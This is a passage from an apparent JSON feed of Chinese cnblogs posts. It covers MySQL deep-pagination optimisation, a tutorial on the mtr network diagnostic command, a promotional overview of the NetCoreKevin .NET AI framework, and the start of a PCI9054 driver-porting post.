      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sun-10387834/p/19491242\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 11:57\">\n    <span>MySQL深度分页优化实战：从踩坑到落地的全攻略</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>做后端开发的同学，大概率都遇到过MySQL分页的坑——浅分页时查询秒回，一旦翻到几十页、上百页之后，接口就开始卡顿，甚至直接超时。之前在做电商商品列表接口时，就因为没处理好深度分页，线上出现过多次接口超时告警，排查后才发现是分页SQL的问题。今天就结合实际开发经验，聊聊MySQL深度分页的本质问题，以及那些能直接落地的优化方案，都是经过生产环境验证的干货。</p>\n<p>先说说最开始踩的坑。当时商品列表接口用的是最常规的分页写法，也就是LIMIT offset, size，代码里封装了通用分页逻辑，前端传页码和每页条数，后端计算offset后拼SQL。上线初期数据量少，翻个十几页都没问题，可随着商品数据涨到几十万条，用户翻到第500页之后，接口响应时间直接从几十毫秒飙升到几百甚至上千毫秒，监控面板上全是红色告警。</p>\n<h2 id=\"一深度分页为什么会慢\">一、深度分页为什么会慢？</h2>\n<p>一开始以为是索引没建对，排查后发现索引是正常的，后来翻了MySQL官方文档，再结合执行计划分析，才搞懂了核心原因。我们常用的LIMIT offset, size写法，比如LIMIT 100000, 20，MySQL并不是直接跳过前10万条数据取后面20条，而是会从表的第一条数据开始，逐行扫描，一共读取100020条数据，然后丢弃前10万条，只返回最后20条。</p>\n<p>这就意味着，offset越大，MySQL需要扫描的行数就越多，磁盘IO和内存消耗都会急剧增加，查询效率自然呈指数级下降。如果分页SQL还没命中索引，触发全表扫描，那情况会更糟，直接导致整个数据库实例压力飙升，影响其他接口。</p>\n<h2 id=\"二实战优化方案从易到难落地\">二、实战优化方案：从易到难落地</h2>\n<p>针对深度分页问题，没有万能方案，只能结合业务场景选择最合适的。下面按优先级排序，分享几个实际项目中用过的优化方案，从改造成本低到高逐步说明。</p>\n<h3 id=\"方案一书签分页最优解90场景适用\">方案一：书签分页（最优解，90%场景适用）</h3>\n<p>这是我目前在项目中用得最多的方案，改造成本低，性能提升明显，核心思路是放弃offset偏移，用上一页最后一条数据的主键或唯一索引作为“书签”，让MySQL直接通过索引定位到书签位置，再往后查询指定条数，彻底避免扫描无用数据。</p>\n<p>比如之前的商品列表，用主键id排序，原来的低效写法是：</p>\n<pre><code class=\"language-sql\">-- 第5001页，每页20条，offset=100000\nSELECT id, name, price, category FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20;\n</code></pre>\n<p>优化后，让前端传递上一页最后一条数据的id，比如上一页最后一条id是100000，新的SQL写法是：</p>\n<pre><code class=\"language-sql\">SELECT id, name, price, category FROM goods WHERE category=1 AND id &gt; 100000 ORDER BY id LIMIT 20;\n</code></pre>\n<p>这样MySQL会直接通过主键索引定位到id=100000的位置，再往后取20条数据，只扫描20条记录，不管数据量多大，查询速度都能稳定在毫秒级。</p>\n<p>这里有个需要注意的点：如果排序字段不是主键，而是普通字段（比如create_time），且存在重复值，直接用该字段作为书签会导致分页重复或漏数据。这时需要用“排序字段+主键”的组合作为锚点，保证唯一性。</p>\n<p>比如按创建时间倒序分页，优化写法如下：</p>\n<pre><code class=\"language-sql\">-- 上一页最后一条数据：create_time='2026-01-15 18:30:00'，id=100000\nSELECT id, name, price, create_time FROM goods \nWHERE category=1 AND (create_time &lt; '2026-01-15 18:30:00' OR (create_time = '2026-01-15 18:30:00' AND id &lt; 100000))\nORDER BY create_time DESC, id DESC LIMIT 20;\n</code></pre>\n<p>这种组合锚点的方式，能完美解决排序字段重复导致的分页异常问题，也是生产环境中处理非主键排序分页的标准写法。</p>\n<h3 id=\"方案二子查询join优化兼容跳页需求\">方案二：子查询/JOIN优化（兼容跳页需求）</h3>\n<p>书签分页的缺点是不支持直接跳转到指定页码，而很多业务场景（比如后台管理系统的分页组件）必须有页码选择功能，这时就需要用子查询或JOIN来优化。</p>\n<p>核心思路是：先通过索引查询出需要的主键ID，再通过主键关联查询全字段数据。因为主键是聚簇索引，查询主键的速度极快，子查询只扫描主键字段的offset+size条数据，而不是全字段，能大幅降低IO开销。</p>\n<p>原来的低效写法优化前：</p>\n<pre><code class=\"language-sql\">SELECT * FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20;\n</code></pre>\n<p>用JOIN优化后的写法（性能更优，MySQL推荐）：</p>\n<pre><code class=\"language-sql\">SELECT g.* FROM goods g\nJOIN (SELECT id FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20) t ON g.id = t.id\nORDER BY g.id;\n</code></pre>\n<p>这种方案能完美兼容跳页需求，不需要改造前端分页组件，性能比原生LIMIT提升10~100倍，offset越大，优化效果越明显。需要注意的是，子查询中的排序字段必须建立索引，否则子查询依然会全表扫描，优化失效。</p>\n<h3 id=\"方案三业务层限制最简单的兜底方案\">方案三：业务层限制（最简单的兜底方案）</h3>\n<p>其实很多ToC业务场景中，用户根本不会翻到第100页之后。比如电商商品列表，用户通常只看前10页，翻到后面的概率极低。针对这种场景，最简单的优化方式就是在业务层限制最大页码。</p>\n<p>我们当时在商品列表接口中做了限制：最多只能翻到第50页，超过50页就提示“暂无更多数据”，同时引导用户通过筛选条件（比如价格区间、销量排序）缩小查询范围。这种方式零开发成本，零性能损耗，直接从根源解决问题，适合大多数ToC业务。</p>\n<h3 id=\"方案四特殊场景兜底海量数据批量导出\">方案四：特殊场景兜底（海量数据/批量导出）</h3>\n<p>如果遇到千万级数据的深度分页，或者需要批量导出海量数据的场景，上面的方案可能不够用，这时可以考虑预生成分段ID或使用游标分页。</p>\n<p>预生成分段ID的思路是：在数据表中新增segment_id字段，按主键分段（比如每1000条数据为一个分段），建立segment_id索引。分页时先按segment_id定位分段，再在分段内分页，避免大范围扫描。这种方式适合数据更新频率低的场景，性能极致，但需要预处理数据。</p>\n<p>游标分页则适合批量数据导出、离线任务等不需要跳页的场景，通过MySQL游标逐行读取数据，避免一次性加载大量数据到内存，不会有offset的性能问题，但业务改造成本较高，只适合后端离线任务。</p>\n<h2 id=\"三优化必守原则缺一不可\">三、优化必守原则（缺一不可）</h2>\n<p>不管用哪种优化方案，以下两个原则必须遵守，否则所有优化都会失效：</p>\n<p>1. 分页SQL必须命中索引：WHERE筛选条件+ORDER BY排序条件，必须建立对应的单列索引或联合索引，否则MySQL会触发全表扫描+文件排序，性能依然极差。比如上面的商品列表，需要建立category+id的联合索引，才能让分页SQL高效执行。</p>\n<p>2. 避免使用SELECT *：只查询需要的字段，减少数据传输和内存开销。如果表中有text、blob等大字段，SELECT *会导致性能严重损耗，甚至拖慢整个数据库。</p>\n<h2 id=\"四总结\">四、总结</h2>\n<p>MySQL深度分页的核心矛盾，本质是offset导致的无效扫描。优化的核心思路就是：能不用offset就不用，优先用书签分页；必须用offset就减少扫描数据量，用子查询/JOIN优化；业务上能限制分页深度就限制，从根源规避问题。</p>\n<p>在实际开发中，不需要追求最复杂的方案，而是要结合业务场景选择最合适的。大部分场景下，书签分页+索引优化就能满足需求，改造成本低，性能又稳定。希望这篇实战总结能帮到大家，避开MySQL深度分页的坑。</p>\n\n</div>\n<div id=\"MySignature\">\n    \n<p>❤️ 如果你喜欢这篇文章，请点赞支持！ 👍 同时欢迎关注我的博客，获取更多精彩内容！</p>\n\n<p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/sun-10387834/\" target=\"_blank\">佛祖让我来巡山</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/sun-10387834/p/19491242\" target=\"_blank\">https://www.cnblogs.com/sun-10387834/p/19491242</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 11:57</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sun-10387834\">佛祖让我来巡山</a>&nbsp;\n阅读(<span id=\"post_view_count\">58</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "网络问题如何排查？mtr命令详解",
      "link": "https://www.cnblogs.com/deep-sky/p/19491194",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/deep-sky/p/19491194\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 11:47\">\n    <span>网络问题如何排查？mtr命令详解</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"mtr\">mtr</h3>\n<p><code>mtr</code>命令是一个网络诊断工具，用于检测网络的连通性和延迟。MTR是My Traceroute的缩写，是traceroute和ping命令的结合体。</p>\n<p><code>mtr</code>默认使用<code>ICMP</code>协议，在介绍<code>mtr</code>的详细用法前我们先了解下<code>ICMP</code>协议。</p>\n<h3 id=\"imcp\">IMCP</h3>\n<p><code>ICMP</code>（Internet Control Message Protocol，互联网控制报文协议）<br />\n是一种网络层（OSI 第三层）协议，主要用于在 IP 网络中传递控制信息和错误信息，而不是用来传输业务数据。<br />\n<code>ICMP</code>的作用是：<br />\n1、网络连通性测试<br />\n最常用的就是<code>ping</code>命令，发送的是<code>ICMP Echo Request</code>，对方回复<code>ICMP Echo Reply</code>，用来判断网络是否可达、是否丢包以及延迟</p>\n<p>2、网络故障和错误反馈<br />\n当 IP 包在传输过程中出现问题时，<code>ICMP</code> 会返回错误信息，例如：</p>\n<table>\n<thead>\n<tr>\n<th>场景</th>\n<th>ICMP 类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目标主机不可达</td>\n<td>Destination Unreachable</td>\n</tr>\n<tr>\n<td>路由中 TTL 用尽</td>\n<td>Time Exceeded</td>\n</tr>\n<tr>\n<td>需要分片但禁止分片</td>\n<td>Fragmentation Needed</td>\n</tr>\n</tbody>\n</table>\n<p>例如：路由器发现下一跳不可达时就会被源主机发送一个ICMP不可达报文</p>\n<p>3、网络路径诊断<br />\n<code>traceroute</code>和<code>tracert</code>就是通过<code>ICMP</code>实现的</p>\n<h3 id=\"mtr的用法\">mtr的用法</h3>\n<pre><code>Usage:\n mtr [options] hostname\n\n -F, --filename FILE              从文件中读取hostname(s)\n -4                               使用IPv4\n -6                               使用IPv6\n -f, --first-ttl NUMBER           起跳ttl参数，跳过前面的N-1跳，只只显示TTL=N后的跳（不改变真实路由，只是不显示）\n -m, --max-ttl NUMBER             maximum number of hops\n -u, --udp                        使用UDP 替代 ICMP echo\n -T, --tcp                        使用 TCP 替代ICMP echo\n -P, --port PORT                  使用TCP、SCTP或UDP探测时的目标端口\n -s, --psize PACKETSIZE           设置探测包的 payload 大小（字节）\n -i, --interval SECONDS           设置探测包的 发送间隔\n -r, --report                     报告模式（一次性输出，不刷新）\n -w, --report-wide                报告模式，宽屏对齐输出（字段不截断）\n -c, --report-cycles COUNT        发送探测包次数，设置20快速判断，设置100较为可信\n -j, --json                       以json格式输出\n -x, --xml                        以xml格式输出\n -C, --csv                        以csv格式输出\n -l, --raw                        以原始格式输出\n -n, --no-dns                     不做反向dns解析(只显示ip)\n -y, --ipinfo NUMBER              输出 IP 归属信息（国家 / 运营商）\n\n</code></pre>\n<p>在linux上执行<code>mtr</code>时，<code>mtr</code>会直接操作网络层构造IP/ICMP报文，所以一般需要使用<code>sudo</code>执行</p>\n<p>示例：<br />\n<code>sudo mtr -r -n -c 100 www.baidu.com</code></p>\n<p>输出结果:</p>\n<pre><code>Start: 2026-01-15T19:00:01+0800\nHOST: LTB-MBP.local               Loss%   Snt   Last   Avg  Best  Wrst StDev\n  1.|-- 183.2.172.177              0.0%   100    2.0   1.8   0.4  26.2   3.4\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>含义</th>\n<th>解读要点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>HOST</code></td>\n<td>当前跳主机</td>\n<td><code>*</code> 代表无响应</td>\n</tr>\n<tr>\n<td><code>Loss%</code></td>\n<td>丢包率</td>\n<td><strong>核心指标</strong></td>\n</tr>\n<tr>\n<td><code>Snt</code></td>\n<td>发送包数</td>\n<td>统计样本量</td>\n</tr>\n<tr>\n<td><code>Last</code></td>\n<td>最近一次延迟</td>\n<td>波动参考</td>\n</tr>\n<tr>\n<td><code>Avg</code></td>\n<td>平均延迟</td>\n<td>主要看</td>\n</tr>\n<tr>\n<td><code>Best</code></td>\n<td>最小延迟</td>\n<td>理想情况</td>\n</tr>\n<tr>\n<td><code>Wrst</code></td>\n<td>最大延迟</td>\n<td>是否有抖动</td>\n</tr>\n<tr>\n<td><code>StDev</code></td>\n<td>抖动</td>\n<td>越小越稳定</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"icmp限速\">ICMP限速</h4>\n<p>分析MTR输出时，需要关注两个方面：<strong>丢包率</strong>和<strong>延迟</strong>。如果在某个跳点看到一定程度的丢包，这可能说明该路由器有问题。然而，一些服务提供商普遍会限制MTR使用的<code>ICMP</code>响应速率。这可能会让人误以为丢包，实际上并没有丢包。要判断看到的丢包是真实的还是速率限制引起的，可以看看后续跳跃。如果跳跃显示损失为0.0%，那么很可能是因为：<code>ICMP</code>响应速率限制导致的而非真实的丢包，以下面的MTR结果为例:</p>\n<pre><code>root@localhost:~# mtr -r www.google.com\nHOST: example                       Loss%   Snt   Last  Avg  Best  Wrst   StDev\n   1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n   2. 63.247.64.157                50.0%    10    0.4   1.0   0.4   6.1   1.8\n   3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n   4. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.1\n   5. 72.14.233.56                  0.0%    10    7.2   8.3   7.1  16.4   2.9\n   6. 209.85.254.247                0.0%    10   39.1  39.4  39.1  39.7   0.2\n   7. 64.233.174.46                 0.0%    10   39.6  40.4  39.4  46.9   2.3\n   8. gw-in-f147.1e100.net          0.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>第二跳的丢包率虽然是 50%，但是其后续跳没有丢包且最终能到到达第8跳，所以整个链路实际上通的，第二跳的丢包率是因为<code>ICMP</code>限速导致的。</p>\n<p>可能有的同学会有疑问了，难道最后一跳不会出现<code>ICMP</code>限速吗？<br />\n实际上，<code>mtr</code>发送数据包后，会根据收到的 ICMP 响应类型来判断：</p>\n<pre><code>中间跳返回：ICMP Type 11 (Time Exceeded)\n            → \"TTL 耗尽，我不是目标\"\n            → 继续增加 TTL 探测下一跳\n\n最后一跳返回：ICMP Type 0 (Echo Reply)\n或 ICMP Type 3 (Destination Unreachable)\n            → \"我就是目标主机\"\n            → 停止探测\n</code></pre>\n<p>过程可以类比快递配送链路：</p>\n<ul>\n<li>中间转运站（路由器）：可能不会告诉你\"包裹经过了这里\"（限制或完全不响应ICMP Time Exceeded）</li>\n<li>最终收货点（目标主机）：必须签收并确认\"收到了\"（响应ICMP Echo Reply）</li>\n</ul>\n<p>即使中间转运站不告诉你进度，只要最后收到包裹并有签收确认，就说明整条链路是通的。</p>\n<h4 id=\"真实的丢包场景\">真实的丢包场景</h4>\n<p>以下面的MTR结果为例：</p>\n<pre><code>root@localhost:~# mtr -r www.google.com\nHOST: localhost                      Loss%   Snt   Last  Avg  Best  Wrst   StDev\n   1. 63.247.74.43                   0.0%    10    0.3   0.6   0.3   1.2   0.3\n   2. 63.247.64.157                  0.0%    10    0.4   1.0   0.4   6.1   1.8\n   3. 209.51.130.213                60.0%    10    0.8   2.7   0.8  19.0   5.7\n   4. aix.pr1.atl.google.com        60.0%    10    6.7   6.8   6.7   6.9   0.1\n   5. 72.14.233.56                  50.0%    10    7.2   8.3   7.1  16.4   2.9\n   6. 209.85.254.247                40.0%    10   39.1  39.4  39.1  39.7   0.2\n   7. 64.233.174.46                 40.0%    10   39.6  40.4  39.4  46.9   2.3\n   8. gw-in-f147.1e100.net          40.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>在这个示例中，第三跳的丢包率高达60%且后续跳均出现了丢包率并且影响了最后的第8跳，所以可以判断第三跳是有问题的。由于中间跳<code>ICMP</code>限速和真实丢包会同时发生，所以会出现中间跳的丢包率高于最后一跳丢包率。</p>\n<p>当判断确实出现了丢包时，最好使用MTR双向测试下，因为数据包可能是发送时遇到了问题，也可能是在返回响应时出现了问题。</p>\n<h4 id=\"延迟\">延迟</h4>\n<p>MTR还能测试主机与目标主机之间连接的延迟。由于物理约束，延迟总是随着路由跳数的增加而增加。然而，增长应保持一致且线性。延迟通常是相对的，并且很大程度上取决于主机连接的质量及其物理距离。 在评估可能有问题的连接的 MTR 报告时，除了给定区域中其他主机之间的已知连接速度之外，还应将早期的功能齐全的报告视为上下文。</p>\n<p>以下面的MTR结果为例：</p>\n<pre><code>root@localhost:~# mtr --report www.google.com\nHOST: localhost                      Loss%   Snt   Last   Avg  Best  Wrst  StDev\n    1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n    2. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.8\n    3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n    4. aix.pr1.atl.google.com        0.0%    10  388.0 360.4 342.1 396.7   0.2\n    5. 72.14.233.56                  0.0%    10  390.6 360.4 342.1 396.7   0.2\n    6. 209.85.254.247                0.0%    10  391.6 360.4 342.1 396.7   0.4\n    7. 64.233.174.46                 0.0%    10  391.8 360.4 342.1 396.7   2.1\n    8. gw-in-f147.1e100.net          0.0%    10  392.0 360.4 342.1 396.7   1.2\n</code></pre>\n<p>在第3跳和第4跳之间延迟突然增高，并且在后续跳中仍然很高，这可能表明存在网络延迟问题。</p>\n<p>但是，高延迟并不总是意味着当前路由有问题。 像上面这样的报告意味着，尽管第四跳存在某种问题，流量仍然到达目标主机并返回源主机。 延迟也可能是由返回路线问题引起的。 返回路线不会在 MTR 报告中看到，并且数据包可以采用完全不同的路线往返于特定目的地。</p>\n<p>在上面的示例中，虽然在第3跳和第4跳之间的延迟存在较大跳跃，但在任何后续跳中延迟并没有再增高。 由此，可以合理地假设第四个路由器存在问题。</p>\n<p><code>ICMP</code>限速也会导致延迟增加，以下面的MTR报告为例：</p>\n<pre><code>root@localhost:~# mtr --report www.google.com\nHOST:  localhost                     Loss%   Snt   Last  Avg  Best  Wrst   StDev\n    1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n    2. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.8\n    3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n    4. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.1\n    5. 72.14.233.56                  0.0%    10  254.2 250.3 230.1 263.4   2.9\n    6. 209.85.254.247                0.0%    10   39.1  39.4  39.1  39.7   0.2\n    7. 64.233.174.46                 0.0%    10   39.6  40.4  39.4  46.9   2.3\n    8. gw-in-f147.1e100.net          0.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>乍一看，第4跳和第5跳之间的延迟突然增高了。然而，在第五跳之后，延迟急剧下降。这里测得的实际延迟约为40ms，且并没有影响最后一条的延迟，网络实际上是没有问题的。</p>\n<h4 id=\"什么时候需要使用tcp和udp协议进行检测\">什么时候需要使用TCP和UDP协议进行检测？</h4>\n<p>三种协议的对比</p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>默认使用场景</th>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ICMP</td>\n<td>默认模式</td>\n<td>最常用,大多数设备支持</td>\n<td>容易被防火墙过滤</td>\n</tr>\n<tr>\n<td>UDP</td>\n<td>测试 UDP 服务</td>\n<td>模拟真实 UDP 流量</td>\n<td>可能被过滤,不可靠</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>测试 Web/API 服务</td>\n<td>最接近真实应用流量,不易被过滤</td>\n<td>需要指定端口</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"什么时候使用tcp模式\">什么时候使用TCP模式？</h5>\n<ul>\n<li>场景 1：ICMP被防火墙屏蔽或ICMP限速</li>\n</ul>\n<pre><code># ICMP 模式失败\nmtr api.example.com\n→ 大量 \"waiting for reply\" 或 100% 丢包\n\n# 改用 TCP 模式（测试 443 端口）\nmtr -T -P 443 api.example.com\n→ 正常显示路由路径\n</code></pre>\n<ul>\n<li>场景 2：测试特定服务的网络质量</li>\n</ul>\n<pre><code># 测试 HTTPS 服务（443 端口）\nmtr -T -P 443 api.example.com\n\n# 测试 HTTP 服务（80 端口）\nmtr -T -P 80 www.example.com\n\n# 测试 SSH 服务（22 端口）\nmtr -T -P 22 server.example.com\n\n# 测试数据库（3306 端口）\nmtr -T -P 3306 db.example.com\n</code></pre>\n<p><code>mtr</code>使用TCP协议进行网络检测的过程是通过 TCP三次握手的前两步完成的</p>\n<pre><code>Client → SYN (dst port 443, TTL=N)\nServer → SYN-ACK\nClient → RST   （立刻）\n\n</code></pre>\n<p><code>mtr</code>的TCP模式只完成“三次握手的前两步”，并在收到响应后立刻主动 <code>RST</code>，不会建立真正的TCP连接，更不会形成大量的ESTABLISHED 连接，对目标主机性能几乎没有影响。</p>\n<h5 id=\"什么时候使用udp模式\">什么时候使用UDP模式？</h5>\n<ul>\n<li>场景 1：测试 UDP 应用</li>\n</ul>\n<pre><code># 测试 DNS 服务（53 端口）\nmtr -u -P 53 8.8.8.8\n\n# 测试 VoIP/视频会议（如 10000-20000 端口范围）\nmtr -u -P 16384 meeting.example.com\n\n# 测试游戏服务器\nmtr -u -P 27015 game.example.com\n\n# 测试 VPN（如 OpenVPN，1194 端口）\nmtr -u -P 1194 vpn.example.com\n</code></pre>\n<ul>\n<li>场景 2：ICMP 被限流但 UDP 没有</li>\n</ul>\n<pre><code># 某些网络对 ICMP 限流但允许 UDP\nmtr -u api.example.com\n</code></pre>\n<h3 id=\"小结\">小结</h3>\n<p>有了 mtr 之后，当客户反馈诸如：“我们办公室是千兆宽带、Wi-Fi 也是满格，就是你们的产品不行，页面加载慢、接口响应慢”这类问题时，不必慌张。</p>\n<p>拉上客户一起跑一跑 <code>mtr</code>，把链路情况和丢包率、延迟摆出来，沿途每一跳的网络状态都会清清楚楚地呈现在眼前。问题究竟出在本地网络、运营商链路，还是服务器侧，基本就一目了然了。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 11:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/deep-sky\">DeepSky丶</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "NetCoreKevin是一个基于.NET9 AI时代的 SaaS 企业级AI 架构，专注于 AI 智能体开发与集成,AgentFramework和知识库，为企业提供高效的 AI 应用开发框架。",
      "link": "https://www.cnblogs.com/net-kevin-li/p/19493371",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/net-kevin-li/p/19493371\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 17:47\">\n    <span>NetCoreKevin是一个基于.NET9 AI时代的 SaaS 企业级AI 架构，专注于 AI 智能体开发与集成,AgentFramework和知识库，为企业提供高效的 AI 应用开发框架。</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"技术架构概述\">技术架构概述</h3>\n<p>NetCoreKevin 是一个基于.NET 的现代化 SaaS 企业级架构，专注于 AI 智能体开发与集成。该架构采用前后端分离设计，支持 AI 语义内核（Semantic Kernel）和AgentFramework、RAG 检索增强生成和知识库管理，为企业提供高效的 AI 应用开发框架。<br />\n项目地址：github：<a href=\"https://github.com/junkai-li/NetCoreKevin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/junkai-li/NetCoreKevin</a><br />\nGitee: <a href=\"https://gitee.com/netkevin-li/NetCoreKevin\" rel=\"noopener nofollow\" target=\"_blank\">https://gitee.com/netkevin-li/NetCoreKevin</a></p>\n<h1 id=\"效果图\">效果图</h1>\n<p><img alt=\"fcd93140-00c0-4ac9-8193-604c54cd4933\" class=\"lazyload\" /></p>\n<p><img alt=\"f10597da-2c9c-4cb9-af52-381eb398003d\" class=\"lazyload\" /></p>\n<p><img alt=\"24d23a09-7694-45ff-a796-3c031050d16f\" class=\"lazyload\" /></p>\n<h3 id=\"核心组件与功能\">核心组件与功能</h3>\n<p><strong>AI 智能体框架（AgentFramework）</strong></p>\n<ul>\n<li>提供模块化智能体开发支持，支持多任务调度与协作。</li>\n<li>内置自然语言处理（NLP）能力，支持意图识别与动态响应。</li>\n<li>可扩展的插件机制，允许集成第三方 AI 服务或自定义逻辑。</li>\n<li>实现语义化任务编排。</li>\n<li>支持 OpenAI、Azure OpenAI 等大模型接入，简化 prompt 工程。</li>\n<li>提供技能（Skills）封装，复用预定义 AI 能力（如文本生成、摘要等）。</li>\n</ul>\n<p><strong>RAG 检索增强生成</strong></p>\n<ul>\n<li>结合向量数据库（如 Milvus、FAISS）实现高效知识检索。</li>\n<li>动态注入上下文信息，提升大模型生成结果的准确性与相关性。</li>\n<li>支持多数据源（PDF、数据库、网页）的文档解析与索引构建。</li>\n</ul>\n<h3 id=\"企业级-ai-知识库\">企业级 AI 知识库</h3>\n<ul>\n<li>基于 Elasticsearch 或 Azure Cognitive Search 构建可扩展知识库。</li>\n<li>支持知识图谱化存储与关联查询，增强语义理解能力。</li>\n<li>提供权限管理与审计日志，满足企业合规需求。</li>\n</ul>\n<h3 id=\"前后端分离设计\">前后端分离设计</h3>\n<p><strong>后端技术栈</strong></p>\n<ul>\n<li>.NET Core 9 作为主要运行时，搭配 DDD 领域驱动设计。</li>\n<li>ORM 使用 Entity Framework Core，支持多数据库（SQL Server/PostgreSQL）。</li>\n<li>gRPC 或 RESTful API 提供标准化服务接口。</li>\n</ul>\n<p><strong>前端技术栈</strong></p>\n<ul>\n<li>Vue3</li>\n</ul>\n<h3 id=\"部署与扩展性\">部署与扩展性</h3>\n<ul>\n<li>容器化部署（Docker + Kubernetes），支持云原生架构。</li>\n<li>CI/CD 流水线集成，实现自动化测试与发布。</li>\n<li>横向扩展设计，应对高并发 AI 任务负载。</li>\n</ul>\n<h3 id=\"典型应用场景\">典型应用场景</h3>\n<ul>\n<li>智能客服：结合 RAG 与知识库实现动态问答。</li>\n<li>自动化流程：通过 Semantic Kernel 编排多步骤 AI 任务。</li>\n<li>数据分析：AI 智能体生成可视化报告与业务洞察。</li>\n</ul>\n<p>该架构通过模块化设计与开放集成能力，降低企业 AI 落地门槛，加速智能化转型。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 17:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/net-kevin-li\">NetCoreKevin</a>&nbsp;\n阅读(<span id=\"post_view_count\">27</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PCI9x5x驱动移植支持PCI9054在win7下使用1",
      "link": "https://www.cnblogs.com/haohaoganhuo/p/19493093",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/haohaoganhuo/p/19493093\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 17:06\">\n    <span>PCI9x5x驱动移植支持PCI9054在win7下使用1</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>本驱动最终目的是为了将北京中泰联创科技有限公司的一个数据采集卡老产品驱动升级成WDF框架的新驱动，老驱动使用Driver Studio开发，在64位操作系统下不够稳定，所以要升级成WDF框架。后续用老产品称呼实际硬件，老驱动称呼Driver Studio开发的驱动，新驱动称呼WDF框架驱动。</p>\n<p>开始的时候想使用Qoder直接分析老驱动后自动生成一个WDF框架驱动，结果没有成功，看来它并不是万能，编程过程中直接让他帮忙给些提示还是可以的，大家想要尝试Qoder可以在官网下载，也可以通过下面链接注册下载：<br />\n<a href=\"https://qoder.com/referral?referral_code=T0BDuCGlZU9RQTm4FyaG5cVIGi8wWaFX\" rel=\"noopener nofollow\" target=\"_blank\">Qoder下载链接</a></p>\n<h2 id=\"修改示例程序支持windows7\">修改示例程序支持Windows7</h2>\n<p>在“属性-Driver Settings-Target OS version”设置成windows7后，编译报告不支持1.19错误，改成1.11才能支持</p>\n<p>但是1.11下不支持WdfDmaTransactionSetSingleTransferRequirement函数，注释掉后才能正常编译，这个函数用于确定DMA是否需要单次传输完所有数据，在本驱动中，可以通过同步IO来解决这个问题，后面再说</p>\n<h2 id=\"在目标机器上搭建调试环境\">在目标机器上搭建调试环境</h2>\n<p>首先在windows11上配置，后续再使用windows7。</p>\n<h3 